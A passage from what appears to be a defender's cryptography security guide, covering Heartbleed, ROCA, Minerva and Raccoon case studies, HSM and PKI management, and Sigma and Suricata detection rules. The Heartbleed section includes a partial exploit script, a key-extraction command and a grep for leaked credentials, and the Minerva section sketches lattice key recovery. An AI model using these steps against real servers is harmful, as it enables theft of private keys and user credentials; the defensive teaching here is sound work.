    TLSVersion = extract("tls_version=([^;]+)", 1, AdditionalExtensions)
| summarize Count = count() by SourceIP, DestinationIP, TLSVersion, bin(TimeGenerated, 1h)
```

Suricata rule — detect Heartbleed probe:
```
alert tls any any -> any any (msg:"OpenSSL Heartbleed Attack Attempt"; \
  flow:established,to_server; content:"|18 03|"; depth:2; \
  byte_test:2,>,200,3; sid:1013010; rev:1;)
```

### 9.2 Incident response — cryptographic compromise

**Key compromise response:**
1. Immediately revoke the compromised certificate (submit to CA's revocation endpoint).
2. Generate new key material on a different system (assume the original system is compromised).
3. Issue new certificate with the new key.
4. Update all systems using the compromised key (load balancers, CDNs, API gateways).
5. Enable OCSP Must-Staple on the new certificate to prevent revocation check bypass.
6. Review CT logs for any unauthorized certificates issued for your domain.
7. If the key was used for signing (code signing, JWT), audit all artifacts signed with the compromised key.

**Timeline:**
- 0–1 hour: Revoke certificate, begin key rotation.
- 1–4 hours: Deploy new certificates across infrastructure.
- 4–24 hours: Audit for unauthorized use, review logs for data exfiltration during exposure window.
- 24–72 hours: Post-incident review, update key management procedures.

---

## 10. Cryptographic vulnerability case studies

### 10.1 Heartbleed (CVE-2014-0160)

**Mechanism.** OpenSSL 1.0.1 through 1.0.1f implemented the TLS Heartbeat extension (RFC 6520). The heartbeat request contains a payload and a 16-bit `payload_length` field. The vulnerable code copied `payload_length` bytes from the received record into the response buffer without checking that the actual payload was that long. If the attacker sent a heartbeat request with `payload_length = 16384` but only 1 byte of actual payload, OpenSSL read 16,383 bytes beyond the end of the input buffer — returning whatever adjacent heap memory contained.

**Affected versions.** OpenSSL 1.0.1 (14 March 2012) through 1.0.1f (06 January 2014). Fixed in 1.0.1g (07 April 2014). The vulnerability existed for over two years before public disclosure. OpenSSL 0.9.8 and 1.0.0 branches were not affected (they did not include heartbeat support).

**Exploitation walkthrough.**

Step 1 — Scan for vulnerability:
```bash
# nmap heartbleed detection script
nmap -p 443 --script ssl-heartbleed target.com

# testssl.sh — comprehensive check
testssl.sh --heartbleed target.com:443

# Manual check with OpenSSL (vulnerable client connects to server)
openssl s_client -connect target.com:443 -tlsextdebug 2>&1 | grep "heartbeat"
# "peer server certificate" + "TLS server extension heartbeat" = potentially vulnerable
```

Step 2 — Exploit with purpose-built tooling:
```python
#!/usr/bin/env python3
"""Heartbleed PoC — CVE-2014-0160 (authorized testing only)."""
import socket
import struct

# TLS 1.1 ClientHello followed by malformed Heartbeat request
HEARTBEAT_REQUEST = bytes.fromhex(
    "18"           # ContentType: Heartbeat (24)
    "0302"         # TLS version 1.1
    "0003"         # Length: 3 bytes
    "01"           # HeartbeatMessageType: request (1)
    "4000"         # Payload length: 16384 (but actual payload is 0 bytes)
)

def heartbleed_check(host: str, port: int = 443) -> bytes:
    """Send malformed heartbeat, return leaked memory (if vulnerable)."""
    sock = socket.create_connection((host, port), timeout=10)
    # Send ClientHello (abbreviated — full handshake required in practice)
    # ... complete TLS handshake ...
    sock.send(HEARTBEAT_REQUEST)
    response = sock.recv(65535)
    sock.close()
    # If response length >> 3, server is leaking heap memory
    return response

# Production tools: heartbleed-masstest, ssltest.py (Jared Stafford)
```

Step 3 — Analyze leaked memory:
```bash
# Leaked heap may contain:
# - TLS session keys (allows decryption of recorded traffic)
# - Private key material (RSA private key in OpenSSL heap)
# - Authentication credentials (HTTP Basic auth, session cookies)
# - Request/response bodies from other users

# Automated key extraction
# Heartleech (Robert Graham) — extracts RSA private keys from heartbleed dumps
# https://github.com/robertdavidgraham/heartleech
heartleech --autopwn target.com -f leaked.bin

# Search leaked data for credentials
strings leaked.bin | grep -iE "password|cookie|session|authorization|bearer"
```

**Impact assessment.** Heartbleed affected an estimated 17% of TLS-enabled web servers (those using OpenSSL with heartbeat enabled). The Codenomicon and Google Security teams disclosed simultaneously. CloudFlare's "Heartbleed Challenge" confirmed that private key extraction was practical — multiple researchers independently recovered the challenge server's RSA private key. The Canadian Revenue Agency confirmed attackers used Heartbleed to extract 900 Social Insurance Numbers before the patch.

**Detection.** A Suricata rule for Heartbleed probe detection already exists in §9.1. Additional detection via IDS correlation:

Sigma rule — post-Heartbleed credential abuse:
```yaml
title: Mass Authentication After Heartbleed Window
description: Detect credential stuffing using credentials potentially leaked via Heartbleed
logsource:
  product: webserver
  service: access
detection:
  selection:
    status: 200
    cs-uri-stem|endswith:
      - "/login"
      - "/auth"
      - "/api/token"
  timeframe: 1h
  condition: selection | count(cs-username) by SourceIP > 50
level: high
tags:
  - attack.credential_access
  - attack.t1190
  - cve.2014.0160
```

**Remediation.** (1) Upgrade OpenSSL to >= 1.0.1g. (2) Revoke and reissue ALL certificates — the private key must be assumed compromised. (3) Invalidate all active sessions and force password resets for users who authenticated during the exposure window. (4) Review server logs for heartbeat requests during the vulnerable period. (5) For future protection: compile OpenSSL with `-DOPENSSL_NO_HEARTBEATS` to disable the extension entirely.

### 10.2 ROCA — Return of Coppersmith's Attack (CVE-2017-15361)

**Mechanism.** Infineon Technologies' RSA library (used in Trusted Platform Modules, smart cards, and security tokens) generated RSA keys using a flawed algorithm. Instead of selecting random primes p and q, the library generated primes of the form:

```
p = k * M + (65537^a mod M)
```

where M is the product of the first n successive primes (a primorial), and a is a discrete logarithm. This structure drastically reduced the keyspace. The resulting RSA public key has a detectable fingerprint: the public modulus N satisfies a specific mathematical property (a coppersmith-type relation) that reveals the key was generated by the flawed library.

**Affected devices and systems:**
- Infineon TPM chips (firmware versions up to October 2017): Lenovo, HP, Dell, ASUS, Acer, Fujitsu, Samsung laptops
- Infineon smart cards (JavaCard-based): Estonian national identity cards (~750,000 cards recalled), Spanish national ID, Slovak national ID
- YubiKey 4 and YubiKey 4 Nano (firmware 4.2.6–4.3.4) — RSA keys generated on-device were affected
- Government eID infrastructure in multiple EU countries
- Microsoft BitLocker TPM-backed keys on affected hardware

**Fingerprinting vulnerable keys:**
```bash
# ROCA detection tool (CRoCS laboratory)
# https://github.com/crocs-muni/roca
pip install roca-detect

# Test individual PEM key
roca-detect --key server-rsa.pub

# Scan all SSH host keys on a network
nmap -p 22 --script ssh-hostkey 192.168.1.0/24 -oX ssh_keys.xml
# Parse and feed public keys to roca-detect

# Test a certificate file
roca-detect --cert server.crt

# Test PGP keys from a keyserver
gpg --keyserver hkps://keys.openpgp.org --search-keys target@example.com
gpg --export --armor target@example.com | roca-detect --key -

# Test TPM-resident keys
tpm2_readpublic -c 0x81000001 -o tpm_pub.pem
roca-detect --key tpm_pub.pem
```

**Factorization attack.** Once a key is identified as ROCA-vulnerable, Coppersmith's method for finding small roots of polynomials modulo N allows factorization far faster than general-purpose factoring. Practical attack complexity:

| Key Size | Complexity | Estimated Cost (cloud, 2017) |
|----------|-----------|------------------------------|
| RSA-512 | 2^38 | ~$0.01 (seconds) |
| RSA-1024 | 2^51 | ~$40–$80 (hours) |
| RSA-2048 | 2^60 | ~$20,000–$40,000 (days) |
| RSA-3072 | 2^66 | ~$100,000+ (weeks) |
| RSA-4096 | 2^71 | ~$1,000,000+ (months) |

RSA-2048 keys — the standard length in most deployments — are factored for a cost well within reach of motivated attackers and state actors.

**Remediation.** (1) Identify all keys generated by Infineon's library using `roca-detect`. (2) Revoke affected certificates. (3) Generate replacement keys using a non-Infineon software implementation (OpenSSL, BoringSSL, or equivalent). (4) Update TPM firmware to patched Infineon version. (5) For YubiKey: use firmware >= 4.3.5 or generate RSA keys off-device and import. (6) Audit code-signing keys, SSH keys, and VPN certificates for ROCA-vulnerable moduli.

### 10.3 Minerva (CVE-2019-15809)

**Mechanism.** The ECDSA signing algorithm requires a per-signature random nonce k. The security of ECDSA depends on k being uniformly random and secret. The Athena IDProtect smart card (and several other JavaCard-based implementations) produced ECDSA nonces with a measurable timing bias: the duration of the scalar multiplication step correlated with the bit-length of k. Nonces with leading zero bits completed faster, creating a timing side-channel.

**The lattice attack.** Given enough signatures with biased nonces, the attacker constructs a Hidden Number Problem (HNP) instance. Each signature (r, s) over message hash h with nonce k satisfies:

```
k ≡ s⁻¹ * (h + r * d)  (mod n)
```

where d is the private key and n is the curve order. If the attacker knows that k is biased (e.g., the top b bits are zero with higher probability), this leaks partial information about d. Collecting ~100 signatures with 3-4 bits of nonce bias suffices for a lattice reduction (LLL or BKZ) to recover d completely.

**Exploitation requirements:**
- Local timing measurements of the smart card during ECDSA signing (USB interface timing is sufficient — microsecond-resolution measurements)
- ~100–200 signatures from the same key (practical for authentication scenarios)
- Post-processing via lattice reduction (minutes on a modern workstation)

```python
# Minerva attack — simplified lattice construction
# After collecting (message_hash[i], r[i], s[i], timing[i]) tuples:

from fpylll import IntegerMatrix, LLL

def recover_key(signatures, bias_bits, curve_order):
    """
    Construct HNP lattice from biased ECDSA signatures.
    signatures: list of (h, r, s, estimated_k_bits)
    bias_bits: number of known zero MSBs in k
    """
    n = len(signatures)
    B = IntegerMatrix(n + 2, n + 2)
    # ... populate lattice basis with signature constraints ...
    # ... LLL reduction yields the private key d in the short vector ...
    reduced = LLL.reduction(B)
    d_candidate = reduced[0][0] % curve_order
    return d_candidate
```

**Affected implementations.** Athena IDProtect (CVE-2019-15809), libgcrypt < 1.8.5 (CVE-2019-13627), wolfSSL < 4.1.0, Microchip ATECC508A crypto coprocessor (timing leakage in ECDSA). The fundamental issue — variable-time scalar multiplication — can affect any ECDSA implementation that lacks constant-time guarantees.

**Detection.** Timing analysis of cryptographic operations:
```bash
# Measure ECDSA signing latency distribution
# Biased implementations show a bimodal or skewed distribution
for i in $(seq 1 1000); do
    /usr/bin/time -f "%e" pkcs11-tool --module /usr/lib/libIDProtect.so \
        --sign --mechanism ECDSA --input-file hash.bin --id 01 2>&1
done | sort -n | uniq -c
# A non-constant-time implementation shows distinct timing clusters
```

**Remediation.** (1) Update smart card firmware/applet to patched version. (2) Use deterministic ECDSA (RFC 6979) where possible — eliminates the random nonce entirely. (3) If hardware cannot be updated, replace ECDSA with EdDSA (Ed25519), which uses deterministic nonces by design. (4) For critical infrastructure: migrate to constant-time ECDSA libraries (BoringSSL, libsodium).

### 10.4 Raccoon Attack (CVE-2020-1968)

**Mechanism.** The Raccoon Attack targets TLS 1.2 connections using Diffie-Hellman (finite-field DHE) key exchange. The attack exploits a timing side-channel in how TLS servers handle the DH shared secret. Per the TLS 1.2 specification, the premaster secret is the DH shared value with leading zero bytes stripped. When the shared value has leading zero bytes (probability ~1/256 per byte), the server's response time differs measurably because:

1. The DH shared secret computation produces a byte array.
2. Leading zero bytes are stripped before using the value as the premaster secret.
3. This stripping operation (and the subsequent PRF computation on a shorter input) creates a detectable timing difference.

This timing difference — measured at microsecond precision — reveals whether the DH shared secret had leading zero bytes. Combined with a lattice attack similar to Minerva, the attacker can recover the premaster secret if enough handshakes are observed.

**Relationship to §5 (TLS protocol attacks).** Raccoon extends the TLS-DH attack surface covered in §5. Unlike Logjam (§2.3, §5.6) which targets weak DH parameters, Raccoon works against standard-strength DH groups. The timing side-channel exploits the TLS specification's handling of the DH output, not a weakness in the DH parameters themselves.

**Practical constraints.** The attack requires:
- Server using finite-field DHE (not ECDHE — elliptic curve DH uses fixed-length point encoding)
- Extremely precise timing measurements (sub-microsecond)
- Thousands of handshakes with the same server
- Proximity to the server for accurate timing (cross-datacenter latency jitter makes this impractical remotely in most scenarios)

**Testing for vulnerability:**
```bash
# Check if server supports finite-field DHE cipher suites
openssl s_client -connect target.com:443 -cipher 'DHE' 2>&1 | grep "Cipher is"
# If any DHE (non-ECDHE) suite is negotiated, the server is potentially vulnerable

# testssl.sh — check for Raccoon
testssl.sh --raccoon target.com:443

# nmap — enumerate DH cipher suites
nmap -p 443 --script ssl-enum-ciphers target.com | grep -i "DHE_RSA\|DHE_DSS"
```

**Remediation.** (1) Disable all finite-field DHE cipher suites — use ECDHE exclusively. (2) Upgrade to TLS 1.3, which uses HKDF for key derivation (constant-time handling of the DH output, no leading-zero stripping). (3) If DHE must remain enabled: upgrade OpenSSL to >= 1.0.2w, >= 1.1.1h, or >= 3.0.0 (patched to use constant-time premaster secret handling). (4) Prefer ECDHE-based cipher suites in server configuration:
```
# nginx — disable DHE, enforce ECDHE only
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
ssl_ecdh_curve X25519:secp384r1:secp256r1;
```

### 10.5 Log4Shell crypto dimension (CVE-2021-44228)

**Context.** Log4Shell is an RCE vulnerability in Apache Log4j 2 (versions 2.0-beta9 through 2.14.1), not a cryptographic vulnerability per se. However, it demonstrates how RCE can completely bypass TLS-based security controls.

**How Log4Shell undermines crypto-layer security:**

1. **TLS termination bypass.** The attacker's JNDI payload is processed after TLS decryption, inside the application. The encrypted channel protects data in transit — but Log4Shell operates at the application layer, after decryption. The attack does not need to break TLS; it operates on the decrypted content.

2. **Key material exfiltration.** Once RCE is achieved, the attacker can read private keys from the filesystem or memory: TLS private keys, HSM session keys (if the HSM client library caches session keys in application memory), API tokens, database credentials, and encryption keys used for data-at-rest.

3. **Certificate infrastructure compromise.** An RCE on a server that performs certificate operations (CA, registration authority, ACME client) can issue fraudulent certificates, modify CRL/OCSP responses, or disable revocation checking.

4. **Crypto bypass via classpath manipulation.** The JNDI lookup loads attacker-controlled Java classes. These classes can replace the JCE Security Provider, install a backdoored `SecureRandom` implementation (returning predictable values), or patch `javax.crypto` classes at runtime to weaken encryption.

**Detection — crypto-relevant indicators post-Log4Shell:**
```yaml
title: Crypto Key Access After Log4Shell Exploitation Indicator
description: Detect private key file reads from Java processes after JNDI exploitation
logsource:
  product: linux
  service: auditd
detection:
  selection_process:
    comm: "java"
  selection_file:
    name|endswith:
      - ".pem"
      - ".key"
      - ".p12"
      - ".jks"
      - ".keystore"
    syscall: "openat"
  condition: selection_process and selection_file
level: critical
tags:
  - attack.credential_access
  - attack.t1552.004
  - cve.2021.44228
```

**Lesson for cryptographic architecture.** TLS and encryption protect data in transit and at rest, but they cannot protect against RCE in the application that handles the decrypted data. Defense-in-depth requires: (1) application-layer security (input validation, sandboxing, WAF rules), (2) key isolation (HSM with strict access control, not filesystem-resident private keys), (3) runtime integrity monitoring (RASP, code-signing verification), (4) network segmentation to limit post-exploitation lateral movement.

---

## 11. Key management and PKI security

### 11.1 HSM architecture and security boundaries

**Hardware Security Modules (HSMs)** are tamper-resistant hardware devices that perform cryptographic operations and protect key material. Keys generated inside an HSM never leave the hardware boundary in plaintext — they are used for signing, decryption, and key wrapping within the device, and are exported only in encrypted (wrapped) form.

**FIPS 140-3 security levels:**

| Level | Physical Security | Authentication | Key Management |
|-------|------------------|----------------|----------------|
| Level 1 | Production-grade enclosure | Role-based | No physical tamper protection |
| Level 2 | Tamper-evident seals | Role-based with operator authentication | Zeroization on tamper detection |
| Level 3 | Tamper-resistant (active response) | Identity-based, multi-factor | Keys zeroized on tamper detection |
| Level 4 | Complete tamper envelope | Multi-factor, all interfaces | Zeroization on environmental attack |

Most production deployments target FIPS 140-3 Level 3. Level 4 is rare outside of government classified environments.

**PKCS#11 interface.** The standard API for interacting with HSMs (also known as Cryptoki). Key operations are session-based: the application opens a session, authenticates with a PIN, and invokes cryptographic operations through function calls (`C_Sign`, `C_Decrypt`, `C_GenerateKeyPair`, `C_WrapKey`, `C_UnwrapKey`).

```bash
# HSM operations via pkcs11-tool (extends §8.3 with operational focus)

# Initialize a token (first-time HSM setup)
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --init-token --label "production-hsm" --so-pin 1234567890

# Set user PIN
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --init-pin --token-label "production-hsm" --so-pin 1234567890

# Generate RSA key pair (key never leaves HSM)
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --keypairgen --key-type RSA:4096 --id 01 --label "root-ca-key" \
  --token-label "production-hsm" --login --pin $HSM_PIN

# Sign a CSR using HSM-resident key
openssl req -new -engine pkcs11 -keyform engine \
  -key "pkcs11:token=production-hsm;id=%01;type=private" \
  -out ca.csr -subj "/CN=Internal Root CA/O=Corp/C=US"

# Wrap (export) a key for backup — encrypted with another HSM key
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --wrap --id 01 --wrap-with-id 02 --mechanism AES-KEY-WRAP \
  --output-file wrapped-key.bin --login --pin $HSM_PIN
```

**HSM threat model.** Attacks against HSMs include: physical tampering (delidding, FIB probing — mitigated by tamper mesh and active zeroization), API abuse (using legitimate PKCS#11 calls to extract keys via wrap/unwrap oracle attacks), firmware exploitation (CVE-2019-10064 — Thales SafeNet HSMs allowed code execution via crafted firmware updates), and side-channel attacks on HSM I/O (timing of PKCS#11 responses can leak key material).

### 11.2 Certificate lifecycle management

**Issuance.** The certificate lifecycle begins with key pair generation (ideally in an HSM), followed by Certificate Signing Request (CSR) generation, CA validation (domain validation, organization validation, or extended validation), and certificate issuance. ACME (RFC 8555) automates DV certificate issuance (Let's Encrypt, ZeroSSL). For internal PKI: use step-ca, EJBCA, or Vault PKI secrets engine.

**Rotation.** Certificates must be rotated before expiration. Short-lived certificates (90 days for Let's Encrypt, 47 days proposed by Apple/Mozilla ballot SC-081) reduce the window of exposure if a key is compromised.

```bash
# Certbot — automated certificate renewal (ACME)
certbot renew --deploy-hook "systemctl reload nginx"

# Check certificate expiry across infrastructure
echo | openssl s_client -connect target.com:443 2>/dev/null | \
  openssl x509 -noout -dates -subject

# Bulk expiry scanner
for host in $(cat hosts.txt); do
    expiry=$(echo | openssl s_client -connect ${host}:443 2>/dev/null | \
        openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2)
    echo "${host}: ${expiry}"
done | sort -t: -k2 -M

# step-ca — short-lived certificate issuance for internal services
step ca certificate "svc.internal" svc.crt svc.key --provisioner acme \
  --not-after 24h
```

**Revocation mechanisms:**

| Method | Latency | Availability | Privacy | Deployment |
|--------|---------|--------------|---------|------------|
| CRL | Hours (CRL refresh interval) | Requires CRL download | CA sees all revocations | Legacy, simple |
| OCSP | Seconds (per-request) | Real-time, depends on responder uptime | CA sees which certs are checked | Per-certificate queries |
| OCSP Stapling | Seconds (server caches response) | Server pre-fetches, no client-CA contact | CA does not see end-user queries | Preferred modern approach |
| CRLite | Minutes (filter updates) | Client-local filter, offline capable | No CA contact needed | Firefox (experimental) |

```bash
# Check OCSP stapling configuration
openssl s_client -connect target.com:443 -status 2>&1 | \
  grep -A 5 "OCSP Response"

# nginx — enable OCSP stapling
# ssl_stapling on;
# ssl_stapling_verify on;
# resolver 1.1.1.1 1.0.0.1 valid=300s;
# resolver_timeout 5s;

# Manually verify OCSP response
OCSP_URI=$(openssl x509 -in cert.pem -noout -ocsp_uri)
openssl ocsp -issuer issuer.pem -cert cert.pem -url "$OCSP_URI" -resp_text
```

### 11.3 Certificate Transparency

Certificate Transparency (CT, RFC 6962) requires CAs to submit all issued certificates to publicly auditable append-only logs (Merkle trees). The CT log returns a Signed Certificate Timestamp (SCT), which is included in the certificate (via X.509 extension), in the TLS handshake (via the `signed_certificate_timestamp` TLS extension), or via OCSP stapling.

**SCT enforcement.** Chrome and Safari require SCTs from multiple independent CT logs for certificates to be trusted. Certificates issued without CT logging are rejected with a certificate transparency error.

**CT log monitoring — detecting unauthorized certificate issuance:**
```bash
# crt.sh — query CT logs for certificates issued for your domain
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
  jq -r '.[] | "\(.id)\t\(.not_before)\t\(.not_after)\t\(.issuer_name)\t\(.name_value)"' | \
  sort -t$'\t' -k2

# certspotter — continuous CT log monitoring
# https://sslmate.com/certspotter/
# Monitors CT logs and alerts on new certificate issuance for your domains

# Manual Merkle tree audit
# CT logs use Merkle hash trees: each leaf is the hash of a certificate
# The tree root is signed by the log server's key
# Auditors verify inclusion proofs: path from leaf hash to signed root
# Monitors verify consistency proofs: the new root includes the old root

# Detecting rogue CA issuance
# Query all CT logs for certs matching your domain
# Flag certificates from unexpected CAs
# Compare against CAA DNS records to identify policy violations
dig CAA example.com +short
# Expected: 0 issue "letsencrypt.org"
# If CT shows a cert from a different CA, investigate immediately
```

**Merkle tree verification.** CT logs store certificates in a Merkle tree structure. An inclusion proof demonstrates that a specific certificate exists in the log (O(log n) hash computations). A consistency proof demonstrates that a new version of the log includes all entries from a previous version (the log is append-only, no entries were removed or modified).

### 11.4 Key ceremony procedures

A **key ceremony** is a formal, documented, audited process for generating or operating on root CA key material. Root CAs may operate for 20+ years, and their compromise would invalidate the entire trust chain.

**Ceremony components:**
1. **Pre-ceremony:** Secure facility inspection, hardware inventory verification, participant identity verification, role assignment (ceremony administrator, crypto officers, witnesses, auditor).
2. **HSM initialization:** Generate the root key pair on a FIPS 140-3 Level 3+ HSM in an air-gapped environment. Record HSM serial numbers and firmware hashes.
3. **Key generation:** Generate root CA key (RSA-4096 or ECDSA P-384 minimum). The private key never leaves the HSM.
4. **Self-signed certificate creation:** Issue the root CA's self-signed certificate with a long validity period (20–25 years).
5. **Key backup:** Split the HSM activation credentials among multiple custodians using Shamir's Secret Sharing (k-of-n threshold). Typically 3-of-7 or 5-of-11.
6. **Post-ceremony:** Record video of entire process. Publish the ceremony audit log. Store HSM backup tokens in geographically distributed safes.

```bash
# Shamir's Secret Sharing — split HSM PIN among custodians
# ssss-split (from Shamir's Secret Sharing Scheme package)
echo "$HSM_ACTIVATION_PIN" | ssss-split -t 3 -n 7 -w hsm-pin
# Requires 3 of 7 shares to reconstruct
# Distribute shares to custodians in tamper-evident envelopes

# Reconstruct (during authorized ceremony)
ssss-combine -t 3
# Enter 3 shares when prompted
```

### 11.5 Cloud KMS comparison

Cloud key management services provide managed HSM-backed encryption. Key hierarchy follows an envelope encryption model: a Customer Master Key (CMK) in the KMS encrypts Data Encryption Keys (DEKs), which encrypt the actual data. The CMK never leaves the KMS boundary.

| Feature | AWS KMS | Azure Key Vault | GCP Cloud KMS |
|---------|---------|-----------------|---------------|
| HSM backing | FIPS 140-2 Level 3 | FIPS 140-2 Level 2 (Vault) / Level 3 (Managed HSM) | FIPS 140-2 Level 3 |
| Key types | AES-256, RSA, ECC, HMAC | RSA, EC, AES, oct (symmetric) | AES, RSA, EC, HMAC |
| Automatic rotation | Annual (symmetric only) | Configurable | Configurable |
| Multi-region | Multi-region keys (replicated) | Geo-replication | Global or regional |
| Custom key store | CloudHSM backing | Managed HSM or Thales | External key manager (EKM) |
| Envelope encryption | GenerateDataKey API | Wrap/Unwrap operations | Encrypt/Decrypt with DEK |
| Pricing (per key/month) | ~$1 (KMS), ~$1.50 (custom key store) | ~$1–$3 (standard), ~$3K+ (managed HSM pool) | ~$0.06 (software) / $1–$2.50 (HSM) |

**Envelope encryption pattern:**
```python
# AWS KMS — envelope encryption example
import boto3
import os
from cryptography.fernet import Fernet
import base64

kms = boto3.client('kms', region_name='us-east-1')

# Step 1: Generate a Data Encryption Key (DEK) via KMS
response = kms.generate_data_key(
    KeyId='arn:aws:kms:us-east-1:123456789:key/mrk-abc123',
    KeySpec='AES_256'
)
plaintext_dek = response['Plaintext']      # Use for encryption, then discard
encrypted_dek = response['CiphertextBlob'] # Store alongside ciphertext

# Step 2: Encrypt data with the plaintext DEK (client-side)
fernet_key = base64.urlsafe_b64encode(plaintext_dek[:32])
f = Fernet(fernet_key)
ciphertext = f.encrypt(b"sensitive data payload")

# Step 3: Store encrypted_dek + ciphertext (discard plaintext_dek)
# To decrypt: call kms.decrypt(CiphertextBlob=encrypted_dek) to recover DEK
del plaintext_dek  # Never persist the plaintext DEK
```

### 11.6 Secrets management architecture

**HashiCorp Vault** provides centralized secrets management with dynamic secrets, encryption-as-a-service, and fine-grained access control.

```bash
# Vault — PKI secrets engine (internal CA)
vault secrets enable pki
vault secrets tune -max-lease-ttl=87600h pki

# Generate internal root CA
vault write pki/root/generate/internal \
  common_name="Internal Root CA" \
  ttl=87600h \
  key_type=ec \
  key_bits=384

# Configure URLs
vault write pki/config/urls \
  issuing_certificates="https://vault.internal:8200/v1/pki/ca" \
  crl_distribution_points="https://vault.internal:8200/v1/pki/crl"

# Create a role for issuing service certificates
vault write pki/roles/internal-services \
  allowed_domains="svc.internal" \
  allow_subdomains=true \
  max_ttl=24h \
  key_type=ec \
  key_bits=256

# Issue a certificate (short-lived)
vault write pki/issue/internal-services \
  common_name="api.svc.internal" \
  ttl=24h
```

**Vault threat model considerations:**
- **Seal/unseal mechanism.** Vault encrypts its storage with a master key, which is split via Shamir's Secret Sharing. On startup, k-of-n unseal keys must be provided. Auto-unseal via cloud KMS (AWS KMS, Azure Key Vault, GCP KMS) reduces operational burden but introduces a dependency on the cloud KMS.
- **Token and policy management.** All Vault access is token-authenticated. Tokens have TTLs, policies, and renewable/non-renewable semantics. Audit logging is mandatory for compliance.
- **Audit trail.** Vault logs every authenticated request (including the request body and response) to configured audit backends. HMAC-SHA256 hashes sensitive fields.

### 11.7 Key escrow and recovery

Key escrow stores copies of cryptographic keys with a trusted third party, enabling recovery if the primary key holder becomes unavailable (employee departure, hardware failure, litigation hold). Escrow introduces a concentrated attack target — the escrow agent holds keys for many entities.

**Recovery procedures:**
1. Dual-control: require two authorized individuals to initiate key recovery.
2. Audit: log all recovery operations with requestor identity, justification, and approval chain.
3. Time-bound: recovered keys should be used for the minimum necessary period, then rotated.
4. Separation: escrow storage should be separate from the production key management system.

For data-at-rest encryption: prefer key wrapping (store the DEK encrypted under an escrow key) rather than escrowing the raw DEK. This limits exposure — the escrow key itself can be stored in an HSM with M-of-N access control.

---

## 12. Cryptographic detection engineering

### 12.1 Sigma rules for cryptographic anomalies

**Weak cipher suite negotiation (RC4, DES, export ciphers):**
```yaml
title: TLS Connection Negotiated Weak Cipher Suite
description: Detect connections using known-broken cipher suites indicating misconfiguration or downgrade attack
logsource:
  product: zeek
  service: ssl
detection:
  selection_weak:
    cipher|contains:
      - "RC4"
      - "DES"
      - "3DES"
      - "EXPORT"
      - "NULL"
      - "anon"
      - "SEED"
      - "IDEA"
      - "CAMELLIA"
  filter_expected:
    dst_ip|cidr:
      - "10.0.0.0/8"      # exclude known legacy internal systems (tune per environment)
  condition: selection_weak and not filter_expected
level: high
tags:
  - attack.credential_access
  - attack.t1557
  - attack.t1040
falsepositives:
  - Legacy systems that cannot be upgraded (should be network-isolated)
```

**Certificate transparency anomaly — unexpected CA issuance:**
```yaml
title: Certificate Issued by Unexpected Certificate Authority
description: Detect certificates for monitored domains issued by CAs not in the approved list
logsource:
  product: ct_monitor
  service: certstream
detection:
  selection_domain:
    domain|endswith:
      - ".example.com"
      - ".corp.internal"
  filter_approved_ca:
    issuer_org:
      - "Let's Encrypt"
      - "DigiCert Inc"
      - "Internal CA"
  condition: selection_domain and not filter_approved_ca
level: critical
tags:
  - attack.credential_access
  - attack.t1556
  - attack.t1587.003
```

**Expired or self-signed certificate in production:**
```yaml
title: Self-Signed or Expired Certificate in Production Traffic
description: Detect TLS connections using self-signed or expired certificates on production networks
logsource:
  product: zeek
  service: ssl
detection:
  selection_selfsigned:
    validation_status: "self signed certificate"
  selection_expired:
    validation_status: "certificate has expired"
  filter_internal_dev:
    dst_ip|cidr:
      - "172.16.0.0/12"   # development network — tune per environment
  condition: (selection_selfsigned or selection_expired) and not filter_internal_dev
level: high
tags:
  - attack.defense_evasion
  - attack.t1553.004
```

**Mass certificate issuance (ACME abuse):**
```yaml
title: Mass Certificate Issuance From Single Source
description: Detect potential ACME abuse — rapid bulk certificate requests indicating domain takeover or phishing infrastructure setup
logsource:
  product: ct_monitor
  service: certstream
detection:
  selection:
    issuer_org: "Let's Encrypt"
  timeframe: 1h
  condition: selection | count(domain) by requester_ip > 20
level: medium
tags:
  - attack.resource_development
  - attack.t1583.003
falsepositives:
  - CDN providers provisioning certificates for many customers
  - Large organizations with automated certificate pipelines
```

**HSM audit log anomalies:**
```yaml
title: HSM Key Export or Unusual Administrative Operation
description: Detect HSM operations indicating unauthorized key extraction or administrative abuse
logsource:
  product: hsm
  service: audit
detection:
  selection_export:
    operation|contains:
      - "C_WrapKey"
      - "C_ExtractKey"
      - "ExportKey"
      - "BackupKey"
  selection_admin:
    operation|contains:
      - "InitToken"
      - "InitPIN"
      - "SetPIN"
      - "DestroyObject"
  selection_after_hours:
    timestamp|re: "^.*(0[0-5]|2[1-3]):.*"  # 21:00-05:59
  condition: (selection_export or selection_admin) and selection_after_hours
level: critical
tags:
  - attack.credential_access
  - attack.t1552.004
```

**Cryptomining hash rate indicators:**
```yaml
title: Potential Cryptomining Activity via Stratum Protocol
description: Detect Stratum mining protocol connections indicating unauthorized cryptomining
logsource:
  product: firewall
  service: traffic
detection:
  selection_ports:
    dst_port:
      - 3333
      - 4444
      - 5555
      - 8333
      - 9999
      - 14444
      - 14433
  selection_payload:
    payload|contains:
      - "mining.subscribe"
      - "mining.authorize"
      - "mining.submit"
      - "eth_submitWork"
      - "eth_getWork"
  condition: selection_ports or selection_payload
level: high
tags:
  - attack.impact
  - attack.t1496
```

**TLS downgrade attempt detection:**
```yaml
title: TLS Downgrade Attempt Detected
description: Detect clients or servers negotiating deprecated TLS versions when modern versions are available
logsource:
  product: zeek
  service: ssl
detection:
  selection_old_version:
    version|contains:
      - "TLSv1.0"
      - "TLSv1.1"
      - "SSLv3"
      - "SSLv2"
  filter_legacy:
    server_name|endswith:
      - ".legacy.internal"   # known legacy systems — tune per environment
  condition: selection_old_version and not filter_legacy
level: high
tags:
  - attack.credential_access
  - attack.t1557.002
```

### 12.2 YARA rules for cryptographic weaknesses

**Weak crypto implementation patterns in binaries:**
```yara
rule Weak_Crypto_DES_ECB_In_Binary
{
    meta:
        description = "Detect DES or ECB mode usage in compiled binaries"
        severity = "high"
        author = "crypto-detection"
